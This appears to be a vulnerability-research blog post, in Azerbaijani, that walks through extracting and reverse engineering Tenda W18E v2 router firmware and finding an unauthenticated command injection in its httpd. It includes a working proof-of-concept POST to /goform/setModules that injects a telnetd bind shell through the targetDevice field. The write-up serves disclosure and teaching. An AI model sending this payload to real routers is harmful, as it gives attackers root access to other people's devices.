---
layout: post
title:  "Router-ləri əyləncə üçün hack etmək, qazanc üçün yox"
date:   2026-10-27 12:00:00 +0400
categories: exploit-development
tags: [iot, firmware-analysis, command-injection, mips, ghidra, router]
lang: az
ref: routers
permalink: /exploit-development/2026/10/27/hacking-routers-for-fun-and-not-profit.html
description: "Bu yaxınlarda başa düşdüm ki, binary exploitation baxımından tutorial-lara baxmaq və kurs materiallarından öyrənmək o qədər də maraqlı deyil, ona görə də real hədəflər seçmək istədim — bu da məni IoT cihazlarına, xüsusən router-lərə gətirib çıxardı…"
canonical_url: "https://medium.com/@Cushz/hacking-routers-for-fun-and-not-profit-f37da822f745"
---

<figure>
  <img src="/assets/img/routers/1-kBvAeebtnXoE_8CmknkDcA.gif" alt="screenshot" loading="lazy">
</figure>

## Giriş

Bu yaxınlarda başa düşdüm ki, binary exploitation baxımından tutorial-lar etmək və kurs materiallarından öyrənmək o qədər də maraqlı və faydalı deyil, ona görə də real məhsullarda nə baş verdiyini görmək üçün real hədəflər seçmək istədim və bu da məni IoT cihazlarını, xüsusən də router-ləri seçməyə yönəltdi. Pwn2Own-a və ya digər təşəbbüslərə baxsanız, onlar əsasən router exploit-lərini digər IoT cihazlarından daha çox qiymətləndirirlər, bəs niyə də yox?

Tp-Link, Broadcom və bu kimi çoxlu vendor olsa da, mən Tenda-nı seçmək qərarına gəldim. Vendor seçməzdən əvvəl qarşıma qoymalı olduğum iki şərt var idi.  
1) O, real şəraitdə (in the wild) istifadə olunmalıdır  
2) Public firmware olmalıdır

Əgər IoT cihazları ilə işləmisinizsə, yəqin bilirsiniz ki, onlar firmware ilə işləyir. Vendor-ların bəziləri firmware-i artıq yayımlayır, bəziləri isə yayımlamır — bu halda onu hardware-dən dump etmək üçün bir növ UART/JTAG sehrbazlığı etməlisən, amma məndə belə avadanlıq yoxdur, ona görə də public firmware-i olan birini tapmalı idim.

Bu 2 şərt üçün Tenda mükəmməl uyğunluq idi. Həmçinin bizim ölkədə tenda məşhurdur ki, bu da məni bu vendor-a daha çox maraqlandırdı.

Hər halda, Tenda router-lərini və onların public firmware-lərini axtararkən başa düşdüm ki, firmware-lərin bəziləri SSL ilə şifrələnib. Bu, əslində bütün source code sənin əlindədir, amma parolla qorunan zip faylı kimidir və onu decrypt edə bilmirsən. Ona görə də SSL ilə şifrələnməmiş birini seçməli idim. Məhz onda bununla rastlaşdım:

<figure>
  <img src="/assets/img/routers/1-3N0xx4Y1HPYfk-m6d6Snxg.jpeg" alt="W18E v2.0 AC1200 Dual Band Gigabit Enterprise Wireless Router" loading="lazy">
  <figcaption>W18E v2.0 AC1200 Dual Band Gigabit Enterprise Wireless Router</figcaption>
</figure>

Firmware araşdırmasında adətən əsasən izlədiyin 2 addım olur.  
1) Firmware-i extract et  
2) Firmware-i reverse engineer et  
3) Həqiqətən zəif (vulnerable) olub-olmadığını görmək üçün PoC yaz

3-cü addım üçün hardware-in özü məndə yoxdur, ona görə də onu QEMU-nun köməyi ilə emulyasiya etməli idim (Fabrice Bellard-a təşəkkürlər).

tam olaraq həmin firmware-i buradan yükləyə bilərsiniz: [https://www.tendacn.com/material/show/824455349567557?proPath=W18EV2](https://www.tendacn.com/material/show/824455349567557?proPath=W18EV2)

## Firmware-i extract etmək

Firmware-i yüklədikdən sonra onu extract etmək üçün binwalk istifadə etdim.

```
~/Firmware_Hacking ❯ binwalk -e US_W18EV2_kf_V16.01.0.20\(4766\)_HighPower\ \(1\).bin
........
~/Firmware_Hacking ❯ cd _US_W18EV2_kf_V16.01.0.20\(4766\)_HighPower\ \(1\).bin.extracted/
~/Firmware_Hacking/_US_W18EV2_kf_V16.01.0.20(4766)_HighPower (1).bin.extracted ❯ ls
20F29F.squashfs  80  80.7z  squashfs-root  squashfs-root-0
```

extract zamanı sənə bəzi warning-lər verəcək, amma onları nəzərə almaya bilərsən.
squashfs-root içində analiz edə biləcəyimiz çoxlu binary fayl var.

```
~/Firmware_Hacking/_US_W18EV2_kf_V16.01.0.20(4766)_HighPower (1).bin.extracted/squashfs-root/bin ❯ ls
3322ip      cameraDiscovery  dhcp6c       dhcps            httpd                 l2tp_dhcpc_wan3  netcheck     pppd6_wan3        pptp_dhcpc_wan4  set_proc.sh   tendaupgrade    wpad
88ip        cfm              dhcp6c_wan1  dhcps-guest      igmpproxy             l2tp_dhcpc_wan4  netctrl      pppd6_wan4        pptp_wan1        setmac        type_identify   wps_msg
acbs        cfmd             dhcp6c_wan2  discovery-dhcp   igmpproxy.sh          lan_dhcps0       network      pppdForPppServer  pptp_wan2        sfwifi_ate    ucloud          wserver
acbs_cli    checklock        dhcp6c_wan3  discovery-pppoe  imsd                  lldpd            ngrokc       pppdForPptp       pptp_wan3        sh            ucloudapp       wserver_notify.sh
appmgr      clear-table      dhcp6c_wan4  dnrd             inadyn                logdebug         ntdd         pppd_wan1         pptp_wan4        show-table    uhttpd          xl2tpcltpppd
arpbrocast  db_dhcpc_wan1    dhcp6s       dnrd-guest       install_kernel_ko.sh  login            onvifproxy   pppd_wan2         pptpd            sntp          unset-value     xl2tpd-client
arpgateway  db_dhcpc_wan2    dhcpcd       dnrd-wisp        ip                    login.sh         phddns       pppd_wan3         pptppppd         sqlite3       vconsole        xl2tpd-server
ash         db_dhcpc_wan3    dhcpcd_ac    flash            ip6tables             logserver        phddns_wan1  pppd_wan4         pptppppd-server  ssdpd         wcli            xl2tpd_wan1
ate         db_dhcpc_wan4    dhcpcd_lan   flash_erase      iptables              miniupnpd        phddns_wan2  pppd_wisp         pservice_tool    steer_cli.sh  wdtctl          xl2tpd_wan2
ate_cmd     db_pppd_wan1     dhcpcd_wan1  flash_unlock     iw                    monitor          phddns_wan3  pppnotify         publish          steerd        wifi            xl2tpd_wan3
ate_init    db_pppd_wan2     dhcpcd_wan2  get-value        jshn.sh               msgagent         phddns_wan4  pptp_callmgr      radvd            subscribe     wifi_init.sh    xl2tpd_wan4
ate_server  db_pppd_wan3     dhcpcd_wan3  gnway            km_cmd                msgd             pppd         pptp_dhcpc_wan1   restart_imsd.sh  swconfig      wifibase        xl2tpdpppd
authmgr     db_pppd_wan4     dhcpcd_wan4  hostapd          l2tp_dhcpc_wan1       multiWAN         pppd6_wan1   pptp_dhcpc_wan2   sdwanctl         tcpdump       wpa_cli
burn_make   debug            dhcpcd_wisp  hostapd_cli      l2tp_dhcpc_wan2       net_config.sh    pppd6_wan2   pptp_dhcpc_wan3   set-value        temp          wpa_supplicant
```

Burada mən httpd binary-sinə fokuslanmaq qərarına gəldim. Çünki Tenda üzərində əvvəllər aparılmış araşdırmalara baxsan, onlar əsasən bu binary-ni hədəf alırdılar. Bu, Tenda tərəfindən administrativ funksionallıqların idarə olunması üçün istifadə olunan əsas web server-dir. O həm də backdoor-lar və bu kimi şeylərlə məşhurdur.

## httpd-ni reverse engineer etmək

Bu faylı ghidra-ya əlavə edəndə gördüm ki, bu, fərqli arxitekturadır (MIPS) — əvvəllər onunla işləməmişəm, amma ümid edək ki, çətin olmayacaq.

<figure>
  <img src="/assets/img/routers/1-oOCOA7RxHKcHVgHNhBLUnQ.png" alt="Ghidra output" loading="lazy">
  <figcaption>Ghidra output</figcaption>
</figure>

Nəzərə alsaq ki, onun nəhəng codebase-i var, bütün funksiyalara təsadüfi şəkildə baxmaq ağıllı olmazdı. Binary exploitation-da əsas məqsəd user input-un validasiya olmadan icra olunduğu bir yer tapmaqdır. Onu C/C++ kimi dillərdə tapmaq üçün çoxlu variantın var, amma bəziləri bunlardır:  
1) scanf, snprintf, memcpy və bu kimi şeylərin istifadəsi.  
2) Get…., Set…., Do…. və s. kimi adları olan exported funksiyalar.

Əsasən, ya istifadə olunan native vulnerable funksiyaları tapırsan, ya da vulnerable ola biləcək custom funksiyaları.

Bir az araşdırmadan sonra bununla rastlaşdım. Maraqlı funksiyalardan biri doSystemCmd idi. Ad özü artıq bu funksiyanın nə edə biləcəyini mənə deyir.
Məsələn:

<figure>
  <img src="/assets/img/routers/1-GaZ9K5LUhLK0dkf6rhXOgQ.png" alt="screenshot" loading="lazy">
</figure>

Bu funksiyada, doSystemCmd, əsasən sistem əmrlərini icra edir. Bu vacibdir və gələcəkdə lazım olacaq.

İndi mən bu funksiyanın hardcode edilmiş sistem əmrləri yerinə user input ala biləcəyi bütün cross reference-ləri tapmalıyam. Xoşbəxtlikdən, arqumentlərin hardcode edilmədiyi birini tapdım. Bu, do_packet_action adlı funksiya idi.

<figure>
  <img src="/assets/img/routers/1-fqNhREOkyXbXpF_sUyVfSw.png" alt="code snippet from do_packet_action()" loading="lazy">
  <figcaption>code snippet from do_packet_action()</figcaption>
</figure>

Bir ilkin (draft) fikir var ki, do_packet_action packet capture funksionallığını həyata keçirir. Onun işi tcpdump əmrini qurmaq və işə salmaqdır. Amma problem ondadır ki, əmr sətrini qurarkən həmin sətrə attacker-ın idarə etdiyi input götürür.  
Axın (flow) əsasən belədir:  
1) Kod dəyərləri (net.check.protocol, net.check.target.device və s.) GetValue vasitəsilə oxuyur və onları stack-ə yerləşdirir  
2) Bu dəyərlər snprintf ilə oxunub tcpdump-a yerləşdirilir. Xüsusən …. %s host %s …. olanlar — burada ikinci %s acStack_254-dür (net.check.protocol) və üçüncü %s local_314-dür (net.check.target.device)  
3) qurulmuş tcpdump əmri doSystemCmd ilə icra olunur

Burada problem ondadır ki, %s sahələri validasiya və ya sanitize olunmur. Bu da onu potensial olaraq command injection-a qarşı zəif (vulnerable) edir.

Qalan son şey net.check.protocol və bu kimi dəyərlərin necə set olunduğunu tapmaqdır və kiçik bir reference əsaslı axtarışdan sonra tapdım ki, o, formSetNetCheckTools() adlı funksiyada set olunur.

<figure>
  <img src="/assets/img/routers/1-tCZQeB4W2UqaLJvInlqPJA.png" alt="Code snippet from formSetNetCheckTools()" loading="lazy">
  <figcaption>Code snippet from formSetNetCheckTools()</figcaption>
</figure>

Bu funksiya parse olunmuş JSON request body-ni götürüb müvafiq dəyərlərə set edir. Məsələn:  
action = net.check.action  
type = net.check.type  
targetDevice = net.check.target.device

Bəs bu JSON request body haradan gəlir?

Hər funksiyanın proqramın onu çağırmaq üçün istifadə etdiyi bir slot-u var. Mən formSetNetCheckTools-un slot-unu kimin istifadə etdiyini axtardım. O, effektiv olaraq belə deyən bir sətirlə registr olunub: formSetNetCheckTools-u set table-da diagnose adı altında registr et.

<figure>
  <img src="/assets/img/routers/1-SjDEqhzzv5Eh_BIsiBlcMg.png" alt="Code snippet from System_Manage_Register()" loading="lazy">
  <figcaption>Code snippet from System_Manage_Register()</figcaption>
</figure>

Bu modullar registr olunmazdan əvvəl formSetModules ilə set olunur.

<figure>
  <img src="/assets/img/routers/1--gC8-dDO1UfruPs1Jx-YkQ.png" alt="Code snippet from formSetModules()" loading="lazy">
  <figcaption>Code snippet from formSetModules()</figcaption>
</figure>

<figure>
  <img src="/assets/img/routers/1-yOoE1Kr_XvxoNnQi81oC-Q.png" alt="string search for modules" loading="lazy">
  <figcaption>string search for modules</figcaption>
</figure>

Funksiyanın birinci arqumenti cJSON_Parse ilə parse olunur. Başqa bir funksiyada isə formSetModules setModules kimi registr olunur.

Beləliklə, indi burada nə baş verdiyi barədə təxmini bir fikrimiz var. İrəli istiqamətdə ümumiləşdirək:

1. Biz /goform/setModules-a POST request göndəririk
2. body cJSON_Parse(formSetmodules) ilə parse olunur
3. Parse olunmuş dəyərlər formSetNetCheckTools-da daxili bir dəyərə set olunur
4. Bu dəyərlər tcpdump əmrinin qurulmasında istifadə olunur
5. Qurulmuş əmr doSystemCmd ilə icra olunur

Potensial PoC-umuz belə görünəcək:

```
POST /goform/setModules
 {"module":"diagnose","action":"start","interface":"…",
 "protocol":"…","targetDevice":"1.1.1.1;telnetd -l/bin/sh -p9999;"}
```

ki, bu da mənə shell verməlidir.

## PoC-u test etmək

Bu router-i emulyasiya etmək üçün QEMU və FirmAE istifadə edəcəyəm. Bu, əsasən IoT firmware-ləri üçün emulyasiya alətidir.  
Mühiti emulyasiya etmək üçün sadə bir build və run skripti (claude-a təşəkkürlər) mənə kifayətdir.

<figure>
  <img src="/assets/img/routers/1-YGJC1fOQ5x-cmc04IoI1Hg.png" alt="build script" loading="lazy">
  <figcaption>build script</figcaption>
</figure>

<figure>
  <img src="/assets/img/routers/1-liMSINL8CV2zd9W44NbRyw.png" alt="login page for tenda" loading="lazy">
  <figcaption>login page for tenda</figcaption>
</figure>

Build-dən sonra, 8080 portunda router-in login səhifəsini görə bilməliyik.

İndi isə PoC-umuzu işə salaq. Amma nəzərə al ki, id və ya whoami kimi bəzi əmrlər firmware-də mövcud deyil, ona görə də onları inject etməyə çalışma.

<figure>
  <img src="/assets/img/routers/1-NmpU7mpfa8IKJOG2fIvTBA.png" alt="screenshot" loading="lazy">
</figure>

<figure>
  <img src="/assets/img/routers/1-jMtSjAFW67OO7kEmm_90OQ.png" alt="PoC demonstration" loading="lazy">
  <figcaption>PoC demonstration</figcaption>
</figure>

Bu cihazda uid_0 o deməkdir ki, root-dur.

Nəticə olaraq, bu, unauthenticated (əgər factory state-dədirsə) root command injection-dır. PoC və harness (əgər onu real hardware olmadan test etmək istəyirsənsə) həmçinin mənim github səhifəmdə də yayımlanıb.

[https://github.com/Cushz/CVE-2026-118238](https://github.com/Cushz/CVE-2026-118238)
